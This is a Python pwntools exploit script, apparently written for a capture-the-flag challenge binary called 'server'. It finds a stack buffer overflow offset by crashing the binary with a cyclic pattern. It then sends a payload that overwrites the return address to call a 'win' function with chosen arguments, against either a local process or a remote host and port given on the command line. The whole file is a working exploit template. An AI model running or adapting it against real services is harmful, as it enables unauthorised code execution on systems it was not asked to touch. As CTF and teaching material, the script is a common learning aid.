import sys
import argparse
from pwn import *



# =========================   Argument Parsing    ================================
# Setup argument parser
parser = argparse.ArgumentParser(description='Exploit script')
parser.add_argument('mode', choices=['local', 'remote'], help="Mode of execution: 'local' or 'remote'")
parser.add_argument('-b', '--binary', type=str, help='Binary for local execution (required for local mode)', default=None)
parser.add_argument('-hs', '--host', type=str, help='Host for remote connection (required for remote mode)', default=None)
parser.add_argument('-p', '--port', type=int, help='Port for remote connection (required for remote mode)', default=None)

args = parser.parse_args()

#=================================0000000===========================================
# Remote and local mode configuration
host = args.host
port = args.port
binary = args.binary if args.mode == "local" else './server' ## change here to the binary name





elf = context.binary = ELF(binary)



def find_offset(payload, exe):
    p = process(exe)
    p.sendline(payload)
    p.wait()
    offset = cyclic_find(p.corefile.pc)  # for 32bit this
    # offset = cyclic_find(p.corefile.read(p.corefile.sp,4)) #for 64 bit use this
    return offset

offset = find_offset(cyclic(400),'./server') ## change here to the binary name
win = elf.symbols['win']
main = elf.symbols['main']
print(f"Fount offset {offset}")
# Local execution
if args.mode == "local":
    if not binary:
        print("Error: Binary name must be provided for local mode using '-b'.")
        sys.exit(1)

    io = process(binary)  # Local binary execution
    payload = flat({
        offset: [
            win,  ## overwritting the return address
            main, ## to return to main function after executing win function
            0xdeadbeef, ## param 1
            0xc0debabe, ## param 2
        ]
    })
    io.sendline(payload)
    print(io.recvall().decode('latin-1'))

# Remote execution
elif args.mode == "remote":
    if not host or not port:
        print("Error: Host and port must be provided for remote mode.")
        sys.exit(1)


    io = remote(host,port)  # Remote connection
    payload = flat({
        offset: [
            win,  ## overwritting the return address
            main, ## to return to main function after executing win function
            0xdeadbeef, ## param 1
            0xc0debabe, ## param 2
        ]
    })
    io.sendline(payload)
    print(io.recvall().decode('latin-1'))